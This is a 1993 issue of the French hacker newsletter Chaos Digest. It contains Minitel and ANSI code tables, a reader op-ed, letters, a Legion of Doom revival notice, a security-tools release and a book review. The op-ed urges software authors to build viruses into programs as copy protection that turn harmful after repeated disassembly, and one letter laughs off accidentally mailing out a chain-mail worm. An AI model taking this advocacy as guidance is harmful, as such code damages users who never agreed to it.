* Status module (signification de l'octet renvoye)

Bit 0: module ecran. Si ce bit est a 1, la liaison existe.
Bit 1: module clavier.
Bit 2: module modem.
Bit 3: module prise.
Bit 4: module telephonique.
Bit 5: module logiciel.
Bit 6: toujours a 1.
Bit 7: bit de parite.

* Status protocole (signification de l'octet renvoye)

Bit 0: acquittements vers modem. Si ce bit est a 1, la reponse est negative.
Bit 1: idem pour la prise.
Bit 2: non retour d'acquittement pour modem.
Bit 3: idem pour la prise.
Bit 4: fonctionnement suivant la norme PAD-X3. Actif si le bit est a 1.
Bit 5: NC
Bit 6: NC
Bit 7: bit de parite.

* Signification de R et de E (en hexadecimal)

R=code recepteur
E=code emetteur

Module          | R  | E  |
----------------+----+----+
Ecran           | 58 | 50 |
Clavaer         | 59 | 51 |
Modem           | 5A | 52 |
Prise           | 5B | 53 |
Telephonique ** | 5C | 54 |
Logiciel        | 5D | 55 |
----------------+----+----+

* Signification de Cf (en hexadecimal)

Cf=Code de fonctionnement

80 Colonnes   42
Rouleau       43
PCE           44
Minuscules    45
Loupe Haut *  46
Loupe Bas  *  47

* Signification de Mf (en hexadecimal)

Mf=Mode de fonctionnement

Etendu        41
Normal        42

* Signification de o1 (en hexadecimal)

Mise en route  35

Arret          36
Attente        37

* Signification de o2 (en hexadecimal)

Recopie papier     40
Enregistrement     41
Roll up autorise   42
Roll down autorise 43

*   Disponible sur le M1

**  Ces commandes ne fonctionnent qu'a partir du M10 et Minitel suivants.

*** Pour ecrire dans les RAMs du minitel:
    utiliser la commande de telechargement suivi de 01 puis le texte puis 04
    (le texte doit faire 14 caracteres au maximum)
    Si le texte ne commence pas par 01, la RAM est consideree comme vide si
    une demande d'identification est envoyee.

    Si le texte dans une RAM fait plus de 14 caracteres, le code 04 n'est
    pas renvoye.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Codes TRANSPAC

Pour programmer le PAD
           en cours d'usage stoppe transfert et prefixe une commande PAD
                   termine commande PAD et relance transmission
PAR?               Etat de tous les parametres du PAD
PAR? 1,2,5         Etat des parametres 1,2 et 5 du PAD
SET 1:0,3:126      Met a 0 le param.1 et a 126 le param.3
SET?               Demande confirmation du changement de parametres
PROF 4             Configure les parametres du PAD selon le profil 4

Les messages PAD peuvent etre:
DTE    Liberation par le correspondant qua refuse
PAP    Liberation par le correspondant
OCC    Correspondant occupe
DER    Correspondant en derangement
RPE    Le correspondant s'est plante
PCV    Le correspondant refuse PCV
NP     Correspondant inexistanp
NA     Le correspondant ne peur etre appele
RC     Le correspondant a eu des problemes mais est a nouveau pret
NC     Incident reseau
INV    Demande invalide

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Codes ANSI pour le mode 80 colonnes

Notes :

1. La valeur implicite est utilisee quand aucune valeur explicite ou quand
   la valeur 0 est specifie;
2. Pn represente un parametre numerique qui est un nombre decimal. En cas
   d'absence du parametre Pn, la valeur implicite est utilise;
3. Ps represente un parametre selectif qui est un nombre decimal utilise
   pour choisir une sous-fonction. Plusieurs sous-fonctions peuvent etre
   choisies en utilisant plusieurs parametres selectifs separes par des
   points-virgules;
4. Pl represente le parametre ligne qui est un nombre decimal specifie par
   des chiffres ASCII;
5. Pc represente le parametre colonne qui est un nombre decimal specifie
   par des chiffres ASCII.


* Fonctions curseur

CUP - Position du curseur (CUrsor Position)

ESC a Pl ; Pc H

HVP - Position horizontale et verticale (Horizontal and Vertical Posation)

ESC a Pl ; Pc f

CUU - Curseur vers le haut (CUrsor Up)

ESC a Pn A

CUD - Curseur vers le bas (CUrsor Down)

ESC a Pn B

CUF - Curseur vers la droite (CUrsor Forward)

ESC a Pn C

CUB - Curseur vers la gauche (CUrsor Backward)

ESC a Pn D

DSR - Demande de position de curseur (Device Status Report)

ESC a 6 n

Cette sequence indique au controleur d'ecran qu'il doit renvoyer la sequence

CPR.

CPR - Position du curseur (Cursor Position Report)

ESC a Pl ; Pc R

SCP - Sauvegarde de la position du curseur (Save Cursor Position)

ESC a s

RCP - Repositionnement du curseur (Restore Cursor Position)

ESC a u

* Effacement

ED - Effacement ecran (Erase Display)

ESC a 2 J

EUD - Effacement d'ecran superieur (Erase Upper Display)

ESC a 1 J

ELD - Effacement d'ecran inferieur (Erase Lower Display)

ESC a 0 J

EL - Effacement ligne (Erase Line)

ESC a K

EBL - Effacement debut de la ligne (Erase Begin of Line)

ESC a 1 K

EC - Effacement caractere (Erase Character)

ESC a Pn P

SL - Suppression de ligne (Suppress Line)

ESC a Pn M

IL - Insertion de ligne (Insert Line)

ESC a Pn L

IC - Insertion de caracteres (Insert Character)

ESC a Pn a

BIC - Debut d'insertion de caracteres (Begin of Insert Character)

ESC a 4 h

EAC - Fin d'insertion de caracteres (End of Insert Character)

ESC a 4 l

* Selection des modes

SGR - Positionnement des parametres graphiques (Set Graphic Rendition)

ESC a Ps ; .... ; Ps m

+-------------+---------------------------------------+
|Valeur du    | Fonction                              |
|parametre Ps |                                       |
+-------------+---------------------------------------+
|     0       | Mets tous les attributs hors fonction |
|     1       | Caracteres gras                       |
|     2       | Intensite reduite                     |
|     4       | Souligne                              |
|     5       | Clignotant                            |
|     7       | Mode video inverse                    |
|     8       | Mode video normal                     |
|     30      | Caractere de couleur noir             |
|     31      | Caractere de couleur rouge            |
|     32      | Caractere de couleur verte            |
|     33      | Caractere de couleur jaune            |
|     34      | Caractere de couleur bleue            |
|     35      | Caractere de couleur magenta          |
|     36      | Caractere de couleur cyan             |
|     37      | Caractere de couleur blanche          |
|     40      | Fond noir                             |
|     41      | Fond rouge                            |
|     42      | Fond vert                             |
|     43      | Fond jaune                            |
|     44      | Fond bleu                             |
|     45      | Fond magenta                          |
|     46      | Fond cyan                             |
|     47      | Fond blanc                            |
+-------------+---------------------------------------+

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Samuel Mendoza     Electronic Engineer
  _
 (_) _             E-mail: mendoza@musical.fdn.org
(__)(-)( /)        Paris, France.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

------------------------------

Date: Sat, May 1st 1993 +0001
From: hades@altern.com (hades )
Subject: File 2--Virus et Protection #1 (tribune libre)


     Ces deux termes que tout le monde analyse aujourd'hui comme
antinomiques ne le sont peut-etre pas autant qu'il y parait. J'en veux
pour preuves les diverses methodes de protection. Effectivement, nombreux
sont les programmes proteges (quoiqu'ils le soient de moins en moins en
raison du surcout occasionne). Ceux-ci le sont souvent grace a des
methodes de cryptage puis grace a certaines procedures, comme celle
fonctionnant par incrementation d'un compteur limitant le nombre de
copies autorisees. Que de problemes ne posent pas cette methode! Qui n'a
jamais endommage par megarde un logiciel et ne pouvant  reinstaller ce
dernier par ce qu'un formatage malencontreux du disque dur avait
occasionne la perte d'un credit d'installation, avait du telephoner a la
societe distribuant le logiciel pour reobtenir celui-ci moyennant un
temps fou depense inutilement en coups de telephone et en pourparlers.

     Les codes ont egalement ete utilises, mais il n'etait pas trop
difficile de se procurer les differentes cles; sans parler de ceux qui,
un peu au-dessus du lot excellent dans l'art du reverse engineering et
qui "deplombent a tour de bras"... Les methodes de protection sont
nombreuses mais loin d'etre efficaces pour qui y attache un peu de son
temps et de ses neurones.

     Meme si c'est interdit, je n'ai trouve qu'une seule methode pour
eviter de retrouver la copie d'un programme que l'on amis un temps fou a
coder, sur le bureau d'un camarade a qui vous n'avez pas fait l'honneur
de le lui donner: les VIRUS !

     Ceux-ci jamais trop mechant permettent une certaine securite car
ils inspirent souvent la peur ou du moins un certaine crainte, et sont
donc par la meme relativement disuasifs. Tous les createurs de ces virus
informatiques ne sont pas forcement des suppots de satan et j'encourage
ouvertement la protection des oeuvres informatiques par ce moyen (ce qui
rappelont le fut le cas, mais de nombreuses pressions avaient ete faites
afin que cela cesse: invitation a la perte faramineuse de capitaux pour
les grosses societes et grande peine des auteurs independants); encore
faut-il bien s'entendre sur le terme virus.

     Les virus que je preconise ici ne sont absolument pas vicieux et
agissent plutot tel des chiens de garde, puisqu'au bout d'un certain
nombre de tentatives de desassemblage ils finissent par etre excedes et
peuvent le devenir. Ils doivent uniquement servir a la protection et a un
certain respect de la propriete individuelle (cf la modification de la
loi sur la protection des oeuvres de l'esprit de 1985).

     Toujours a propos de virus, j'aimerais, sans relancer la polemique
sur la sortie du livre de Jean Bernard Condat, donner mon humble avis sur
la question. L'idee d'ecrire ce livre, succedant a celui de Ludwig aux
USA, est excellente. Seul le titre me derange quelque peu. En effet,
"C'est decide j'ecris mon virus" (Sortie prevue rappelons-le s'il en est
encore besoin au mois de Juin) doit uniquement etre vu comme une source
de routines permettant non pas de recreer des virus (attention aux
directives de compilation!), ceux-ci ayant ete eprouves, ils ne servent
donc plus a rien (merci Mr Mcafee) mais ils permettra aux programmeurs
d'analyser certaines procedures qui, il ne faut pas se le cacher, sont
d'une remarquable qualite. Les auteurs de "virus malins" sont des
personnes tres competentes qui sont passes de l'autre cote de la
barriere, ce qui est dommage. Mais si on y reflechit bien et pour revenir
a mon idee premiere, comment se propagent la plupart des virus ? Et oui,
bel et bien a cause de personnes qui copient et recopies encore les
logiciels et notamment les jeux. Il est vrai que les logiciels coute
chers et je suis le premier a le deplorer mais le freeware et le
shareware permettent d'acceder a des logiciels d'excellente qualite a
moindre cout (l'enregistrement coute souvent moins de 40$). Par contre
rentrer dans le systeme informatique de grandes entreprises et les
infiltrer afin de leur nuire est bel et bien de l'espionage industriel.
Je pense que tous les detracteurs du CCCF devraient revoir leur copie car
son role est peut-etre plus de montrer qu'il y a des failles dans le
systeme de securite des entreprises que de leur nuire. Non le CCCF n'est
pas un organisme pour psychopathes en mal de sensations fortes. Et toutes
les actions de celui-ci ont certainement un interet. J'avoue ne rien
connaitre en matiere de telematique et d'effractions via modem, mais ma
position sur le sujet est tres claire et je ne tiens pas a ce que l'on me
fasse dire ce que je n'ai pas dit: je ne sais pas reellement ce qui s'y
passe mais je m'etonne que si cela n'avais pas un interet certain le
Chaos Computer Club France perdurerait.

     J'espere ne pas avoir degrade la qualite du ChaosD avec cet ecrit et
souhaite qu'un tel journal puisse continuer a nous informer d'articles qui
savent captiver l'interet des 500 lecteurs de cet hebdo. Bravo a l'equipe!

     A bon entendeur salut!

                      *HADES*

------------------------------

End of Chaos Digest #1.22
************************************

Chaos Digest               Lundi 10 Mai 1993        Volume 1 : Numero 23
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.23 (10 Mai 1993)
File 1--_Chaos Corner_ contre _Chaos Digest_ (image de marque[s])
File 2--Recevoir du courrier pirate devient dangeureux (courrier)
File 3--The Legion of Doom: le retour (actualite)
File 4--TAMU Security Tools Package (nouveau produit)
File 5--Apres la _Galactic Hacker Party_ de 1989... (congres d'ete)
File 6--"Computer Viruses ..." de Haynes/McAfee (critique)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Apr 27 17:15:41 -0500 1993
From: rdc@pelican.cit.cornell.edu (Bob Cowles )
Subject: File 1--_Chaos Corner_ contre _Chaos Digest_ (image de marque[s])


There seems to exist a possible confusion between the name of your digest
and an electronic journal that I have been publishing for several years
(since June, 1991).  I'm not sure what the best resolution is at this point
(it's not like either of us is going to lose any money); but we should
certainly be aware of each other's journal.  I assume that you chose your
name based on the Chaos Club ... and I chose my name (of Chaos Corner) based
on the Chaos Manor column in Byte Magazine (also on the condition of my
office).

I hope that we can cooperate and keep any confusion to a minimum.  The
following file is what I send out in response to requests for information
or new subscriptions:

+++++
What you have here is a combination of Dr. Science (from National Public
Radio), Chaos Manor (from Byte), and Rumor Central (from PC Week).

Chaos Corner is a small, randomly published electronic newsletter I write
that mentions things I have found in the process of wandering across the
network.  Back copies are available, and a copy of Volume 1 and 2 (with an
*index*) is available in PostScript form (via ftp) or bound hardcopy with
nice covers.

Volume 1 (10 issues) or volume 2 (11 issues) can be obtained as a file with
an index at the back.  ftp to pelican.cit.cornell.edu and look in /pub for
the files ccv01.text (the ascii version) and ccv01.ps (the PostScript
version).  For volume 2, look for ccv02.ps or ccv02.text Single issues can
be obtained from the same place and are of the form ccv0Xn0Y.txt where X is
the volume number (1 for 1991, 2 for 1992, and 3 for 1993).

Subscriptions may be obtained by sending mail to:

              chaos-request@pelican.cit.cornell.edu

The lead-in and trailer to Dr. Science always says "I have a masters degree,
in science..."
+++++

Sincerely,

Bob Cowles (bob.cowles@cornell.edu)
Assistant Director for Technologies
(alias dr.chaos... I have a Master's degree)
Cornell Information Technologies
Ithaca, NY    USA

------------------------------

Date: Wed Apr 28 15:33:36 EDT 1993
From: T01CAL%ETSU.BITNET@uga.cc.uga.edu (calvin )
Subject: File 2--Recevoir du courrier pirate devient dangeureux (courrier)
Organization: East Tennessee State University


    sir:
    a mutual friend of ours requested that i write to you and tell you about
recent events at etsu.  ed street has been expelled from this unversity due
to a virus attack.  it is possible that one of ed's viral experiments got
away from him and infected several labs on campus.  the labs were infected
with the DIR_II virus and because of ed's research suspicion feel upon him
one of the effects of the investigation was that ed's cms account was
searched and his correspondance was confiscated.  as part of the investiga-
tion any individuals the ed was in contact are also under "investigation"
and is possibly involved in a "international conspiracy" to penetrate etsu's
security.pretty scary stuff, huh?
                                -c

[ChaosD: Ce message nous est parvenu de la sorte sans autre explication.
Notre correspondant "Ed Street" est l'un des intervenants les plus connus
de "Virus-L Digest". Voici les deux courriers qu'il nous avait envoye avant
que son compte ne soit ferme!]

Date: Fri Nov 13 12:57:54 EST 1992
From: TAWED%ETSU.bitnet@CUNYVM.CUNY.EDU (ed street )
Subject: in responce, and a question...

greetings!

first off my opinion is that every programer should have access to
information pertaining to viruses.  The mass of the public is under the
impressions that viruses's are harmfull, but little do they know that there
main goal is to survive and to replicate.  (it started out from a game...)
but I think I don't need to go into much detail here (you probably know more
than I do on this subject)

I think that re-printing the black book would be a great help to those who
(like me) would love to obtain a source of information on viruses so as to
emperiment... and am in dis-believe that the french goverment is trying to
crack down on such matters...


Also I was curious as to why this question was asked of me, I am very glad
that it was because i've been looking for the club(wanting to possibly join)
and havn't had much luck (more appropriately not enough time).

I was firstly wondering what is the purpose of the club (from the few things
I have heard it's partially for research and program writings...) and as to
how I might be able to join...

thanks;
"hacker" tawed@etsu.bitnet

+++++

Date: Sun Dec  6 19:56:46 EST 1992
From: TAWED%ETSU.bitnet@CUNYVM.CUNY.EDU (me!!!! )
Subject: christma exec a sent... he he he

*laugh* this is funny..

I was reading 'Computer Viruses A High-tech Disease' written by Ralf Burger
in 1988. In it is the source code listing for the christma exec a chain-mail
bug. hmmmm, I thought A good way to sink my teath into REXX. WEll I copied
in to my account and took the original and commented all of it out, as well
as changed a few lines.  Before this I made a copy.

I took the copy and put comments all through it so that I could monitor what
was happening in the program.  And It started sending copies to all those
people in my Names File!!!!!!!!! I started laughing and then later I chased
them all down and found out that only 8 was send out. As of now I have 6
files deleted from those that did get sent out. (what was send out was the
modified version that I disarmed and changed around, in case something like
this would happen.) :-)

anyway one copy did make it's way to a programer at this University so I
don't know about that copy yet.  I sent him mail and told him to erase it.
*laugh* it was funny to watch it execute.|

(P.s. you can use this in the digest if you want, along with making changes
as needed.)
.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=.=
#INCLUDE 
#DEFINE HACKER     "ED STREET" 

VOID MAIN(VOID)    {
    PRINTF("SOMEDAY I WILL GET A *REAL* MESSAGE LINE!!\N");
}

------------------------------

Date: Wed, 5 May 1993 21:15:00 GMT
From: tdc@zooid.guild.org (TDC )
Subject: File 3--The Legion of Doom: le retour (actualite)
Organization: The Zoo of Ids
Repost from: telecom13.305.1@eecs.nwu.edu


Release Date: 4 May 16:07 EDT

READ AND DISTRIBUTE EVERYWHERE - READ AND DISTRIBUTE EVERYWHERE
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

                        Important Anouncement

                                The

                                LOD

                           Legion of Doom

                             Is Back!

No that has not been a mis-print ... the LOD has returned!  The world's
greatest hacking group has formally been reinstated to bring back dignity
and respect to a scene that has rapidly deteriorated since its departure.

Unlike many of these other "Groups" that go around with upper/lower case
names, that trade in PBX's, VMB's etc. and wouldn't know COSMOS if it hit
them over the head.  The LOD, at least to me, imbodies the pinnacle of
understanding that comes from relentless exploration of the "system"
backwards and forwards.  It is an organization dedicated to understanding
the world's computer and telephone networks.  Enabling everyone to progress
forward in technology.  The accumulated product of this -- the Technical
Journals, full of information unavailable anywhere except from telco manuals
represents something to valuable to lose.

It is a true tragedy that after the great witch hunt that was Operation Sun
Devil that the former LOD died.  If the powers that be, think they can shut
down real hackers by undertaking unprovoked, uneeded not to mention
unconstitutional draconian acts they are mistaken. We will not be kept down!

We are a segment of society that enjoys what others label difficult and
technical.  Exploration into the uncharted reaches of technology is our
calling.  Information, learning and understanding is what we are made of.
As the technology revolution impacts us all, it is the hackers and not the
medieval statutes of the land that will lead us forward.

This will be the primary of purpose the new, revived LOD -- the assembly and
release of a Technical Journal.  The previous fourissues, now several years
old BADLY need updating.

The Journal will rely heavily on reader submitted articles and information,
so anything you wish to contribute would be GREATLY appreciated.  Acceptable
submitions would include ORIGINAL "how-to- guides" on various systems,
security discussions, technical specifications and doccumentation.  Computer
and telephone related subjects are not the only things acceptable.  If you
remember, the former journals had articles concerning interrogation and
physical security among others.

The next LOD Technical Journal will comprise almost entirely of freelance or
reader submitted articles. So without YOUR contributions it can not proceed!

If you wish to hold the wonderful honour of being an LOD Member (won't this
look good on your resume), you may apply by contacting us. The qualifica-
tions should need no elaboration.  Any of the previous members that wish
reactivation (doubtful) need only request it.

In addition to needing articles for the upcoming Journals, some sites on the
net to aid in distribution would also be welcomed.  Send all offers and
articles to the following email account:

                         tdc@zooid.guild.org

Closing date for article submittions to the LOD Technical Journal Number 5
is: Monday 14 June, 1993.  Release date: Friday 18 June, 1993.

Since we have no monetary or contractual obligation to anyone, these dates
are of course tentative. But since or at least initially we will rely almost
entirely on reader submitions a date is needed to get potential writers into
gear.

In order that this gain exposure to as much publicity as possible please
post it on any networks that you may have access to.

Note that the LOD does not engage or condone illegal or criminal activities.
This would cover, but is not limited to, theft of long distance services,
credit fraud or data destruction/alteration.

Lord Havoc

[ChaosD: L'adresse e-mail donne dans cet article n'est pas relie directement
a l'InterNet. Envoye vos courriers de preference a: gaea@zooid.guild.org  a
l'attention de LOD.]

------------------------------

Date: Tue May  4 14:36:11 CDT 1993
From: Dave.Safford@sc.tamu.edu (Dave Safford )
Subject: File 4--TAMU Security Tools Package (nouveau produit)

              Texas A&M Network Security Package Overview
                    BETA Release 1.0 -- 4/16/93

                           Dave Safford
                           Doug Schales
                            Dave Hess

DESCRIPTION:

Last August, Texas A&M University UNIX computers came under extensive
attack from a coordinated group of internet crackers.  This package of
security tools represents the results of over seven months of development
and testing of the software we have been using to protect our estimated
twelve thousand internet connected devices.  This package includes
three coordinated sets of tools: "drawbridge", an exceptionally powerful
bridging filter package; "tiger", a set of convenient yet thorough
machine checking programs; and "netlog", a set of intrusion detection
network monitoring programs.  While these programs have undergone extensive
testing and modification in use here, we consider this to be a beta test
release, as they have not had external review, and the documentation is
still very preliminary.

KEY FEATURES:

For full technical details on the products, see their individual README's,
but here are some highlights to whet your appetite:

        DRAWBRIDGE:
                - inexpensive (pc with SMC/WD 8013 cards);
                - high level filter language and compiler;
                - powerful filtering parameters;
                - DES authenticated remote filter management;
                - O(1) table lookup processing for full ethernet;
                  bandwidth processing, even with dense class B net;
                  filter specifications.
        TIGER:
                - checks key binaries against cryptographic;
                  checksums from original distribution files;
                - checks for critical security patches;
                - checks for known intrusion signatures;
                - checks all critical configuration files;
                - will run on most UNIX systems, and has tailored;
                  components for SunOS, Next, SVR4, Unicos.
        NETLOG:
                - efficiently logs all tcp/udp establishment attempts;
                - powerful query tool for analyzing connection logs;
                - "intelligent" intrusion detection program.

AVAILABILITY:

This package is available via anonymous ftp in:
                  sc.tamu.edu:pub/security/TAMU

At this location there is also a script "check_TAMU" that can  perform
cryptographic checksums on the distribution files, in case you obtained
them from other archive sites.

Note that there are some distribution limitations, such as the inability
to export (outside the US) the DES libraries used in drawbridge; see the
respective tool readme's for details of any restrictions.

CONTACT:

Comments and questions are most welcome. Please address them to:
                  drawbridge@sc.tamu.edu

------------------------------

Date: Wed, 28 Apr 1993 04:12:57 -0700
From: emmanuel@WELL.SF.CA.US (Emmanuel Goldstein )
Subject: File 5--Apres la _Galactic Hacker Party_ de 1989... (congres d'ete)
Repost from: CuD #5.32.1


Hack-Tic presents:

   -------------------------------------------------------------------
   H A C K I N G   A T   T H E   E N D   O F   T H E   U N I V E R S E
   -------------------------------------------------------------------

                                     An 'in-tents' summer congress



H U H?
+-------

Remember the Galactic Hacker Party back in 1989? Ever wondered what
happened to the people behind it? We sold out to big business, you
think. Think again, we're back!

That's right. On august 4th, 5th and 6th 1993, we're organising a
three-day summer congress for hackers, phone phreaks, programmers,
computer haters, data travellers, electro-wizards, networkers, hardware
freaks, techno-anarchists, communications junkies, cyberpunks, system
managers, stupid users, paranoid androids, Unix gurus, whizz kids, warez
dudes, law enforcement officers (appropriate undercover dress required),
guerilla heating engineers and other assorted bald, long-haired and/or
unshaven scum. And all this in the middle of nowhere (well, the middle
of Holland, actually, but that's the same thing) at the Larserbos
campground four metres below sea level.

The three days will be filled with lectures, discussions and workshops
on hacking, phreaking, people's networks, Unix security risks, virtual
reality, semafun, social engineering, magstrips, lockpicking,
viruses, paranoia, legal sanctions against hacking in Holland and
elsewhere and much, much more. English will be the lingua franca for
this event, although some workshops may take place in Dutch. There
will be an Internet connection, an intertent ethernet and social
interaction (both electronic and live). Included in the price are four
nights in your own tent. Also included are inspiration, transpiration,
a shortage of showers (but a lake to swim in), good weather
(guaranteed by god), campfires and plenty of wide open space and fresh
air. All of this for only 100 dutch guilders (currently around US$70).

We will also arrange for the availability of food, drink and smokes of
assorted types, but this is not included in the price. Our bar will be
open 24 hours a day, as well as a guarded depository for valuables
(like laptops, cameras etc.). You may even get your stuff back! For
people with no tent or air mattress: you can buy a tent through us for
100 guilders, a mattress costs 10 guilders. You can arrive from 17:00
(that's five p.m. for analogue types) on August 3rd. We don't have to
vacate the premises until 12:00 noon on Saturday, August 7 so you can
even try to sleep through the devastating Party at the End of Time
(PET) on the closing night (live music provided). We will arrange for
shuttle buses to and from train stations in the vicinity.


H O W ?
+-------

Payment: In advance only. Even poor techno-freaks like us would like
to get to the Bahamas at least once, and if enough cash comes in we
may just decide to go. So pay today, or tomorrow, or yesterday, or in
any case before Friday, June 25th 1993. Since the banks still haven't
figured out why the Any key doesn't work for private international
money transfers, you should call, fax or e-mail us for the best way to
launder your currency into our account. We accept American Express,
even if they do not accept us. But we are more understanding than they
are. Foreign cheques go directly into the toilet paper recycling bin
for the summer camp, which is about all they're good for here.


H A !
+-----

Very Important: Bring many guitars and laptops.


M E ?
+-----

Yes, you! Busloads of alternative techno-freaks from all over the
planet will descend on this event. You wouldn't want to miss that,
now, would you?

Maybe you are part of that select group that has something special to
offer! Participating in 'Hacking at the End of the Universe' is
exciting, but organising your very own part of it is even more fun. We
already have a load of interesting workshops and lectures scheduled,
but we're always on the lookout for more. We're also still in the
market for people who want to help us organize this during the
congress.

In whatever way you wish to participate, call, write, e-mail or fax us
soon, and make sure your money gets here on time. Space is limited.


S O :
+-----

> 4th, 5th and 6th of August

> Hacking at the End of the Universe
      (a hacker summer congress)

> ANWB groepsterrein Larserbos
      (Flevopolder, Netherlands)

> Cost: fl. 100,- (+/- 70 US$) per person
      (including 4 nights in your own tent)


M O R E   I N F O :
+-------------------

Hack-Tic
Postbus 22953
1100 DL  Amsterdam
The Netherlands

tel     : +31 20 6001480
fax     : +31 20 6900968
E-mail  : heu@hacktic.nl

V I R U S :
+-----------

If you know a forum or network that you feel this message belongs on,
by all means slip it in. Echo-areas, your favorite bbs, /etc/motd, IRC,
WP.BAT, you name it. Spread the worm, uh, word.

------------------------------

Date: Mon May  3 00:32:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 6--"Computer Viruses ..." de Haynes/McAfee (critique)
Copyright: Robert M. Slade, 1993


St. Martin's Press
175 Fifth Ave.
New York, NY   10010
USA

  Computer Viruses, Worms, Data Diddlers, Killer Programs and Other Threats
    to Your System: what they are, how they work and how to defend your
    PC, Mac or mainframe, John McAfee and Colin Hayes, 1989, 0-312-02889-X


If you buy only one book to learn about computer viral programs -- this is
*not* the one to get.  As a part of a library of other materials it may
raise some interesting questions, but it is too full of errors to serve as
a "single source" reference.

I began to have my doubts about the validity of this book in the foreword,
written by no less a virus researcher than John C. Dvorak.  He states that
what we need, in order to stem the virus problem, is a

    "... Lotus 1-2-3 of virus code.  Something that is so skillfully [sic]
    designed and marvelously [sic] elegant that all other virus programs
    will be subject to ridicule and scorn."

Aside from a rather naive view of human nature, this was obviously written
before his more recent PC Magazine editorial in which he states that virus
writers are the most skilful programmers we have.

The prologue seems to be a paean of praise to one John McAfee, frequently
identified as Chairman of the Computer Virus Industry Association.  He is
also identified as head of Interpath Corporation.  Intriguingly, there is
no mention of McAfee Associates or the VIRUSCAN/SCAN suite of programs.
Given that the "chronology" of computer viral programs ends after 1988,
the present company may not have been a formal entity at the time.

The first six chapters give the impression of being a loose and somewhat
disorganized collection of newspaper articles decrying "hackers".  Some
stories, such as that of the Morris/Internet Worm, are replayed over and
over again in an unnecessary and redundant manner, repetitively rehashing
the same topic without bringing any new information forward.  (Those
having trouble with the preceding sentence will have some idea of the style
of the book.)

Chapters seven to thirteen begin to show a bit more structure.  The
definition of terms, some examples, recovery, prevention, reviewing
antivirals and the future are covered.  There are also appendices; the
aforementioned chronology, some statistics, a glossary, and interestingly,
a piece on how to write antiviral software.

Given what is covered in the book, am I being too hard on it in terms of
accuracy?  Well, let's let the book itself speak at this point.  The errors
in the book seem to fall into four main types.  The least important is
simple confusion.  The Chaos Computer Club of Europe are stated to be "arch
virus spreaders" (p. 13).  The Xerox Worm gets confused with the Core Wars
game (p. 25).  The PDP-11 "cookie" prank program is referred to as "Cookie
Monster", and is said to have been inspired by Sesame Street.

At another level, there is the "little knowledge is a dangerous thing"
inaccuracies.  These might be the understandable result of a journalist
trying to "flesh out" limited information.  The Internet Worm is said to
have used a "trapdoor", an interesting description of the sendmail "debug"
feature (p. 12). "Trapdoor" is obviously an all-encompassing term.  The
"Joshua" program in the movie "Wargames" is also so described on page 78.
Conway's "Game of LIFE" is defined as a virus, obviously confusing the self-
reproducing nature of "artificial life" and not understanding the boundaries
of the programming involved, nor the conceptual nature of Conway's proposal
(p. 25).  Mac users will be interested to learn that "through much of 1988"
they were spreading the MacMag virus, even though it was identified so early
that few, if any, ever reached the "target date" of March 2, 1988, and that
none would have survived thereafter (p. 30).

Some of the information is simply wild speculation, such as the contention
that terrorists could use microcomputers to spread viral software to
mainframes (p. 12).  Did you know that because of the Jerusalem virus, some
computer users now think it wiser to switch the computer off and go fishing
on Friday the 13th (p. 30)?  Or that rival MS-DOS and Mac users use viral
programs to attack each others systems (p.43)?  That the days of public
bulletin boards and shareware are numbered, and that by the early 1990's,
only 7000 BBSes will remain, with greatly reduced activity (p. 43)?  Chapter
thirteen purports to deal with the possible future outcomes of viral
programs, but should be recognizable to anyone as, at best, pulp fiction.

Some of the information is just flat out wrong.  Page 75, "... worms do not
contain instructions to replicate ..."  Or, on page 95, a diagram of the
operations of the BRAIN virus, showing it infecting the hard disk.

We won't delve too deeply into the statements about the CVIA and Interpath
Corporation.  It is interesting to note, though, that of the antiviral
software "reviewed", only one product still remains in anything like the
same form.  Flu-Shot, at the time the most widely used antiviral software,
is *not* reviewed (although it is mentioned later in the book--in a very
negative sense).

In a sense I am being too hard on the book.  It does contain nuggets of
good information, and even some interesting speculation.  However, the
sheer weight of "dross" makes it extremely difficult to recommend it.  If
you are not familiar with the real situation with regard to viral programs,
this book can give you a lot of unhelpful, and potentially even harmful,
information.  If you are familiar with the reality, why bother with it?

+++++++
Vancouver      ROBERTS@decus.ca         | "Don't buy a
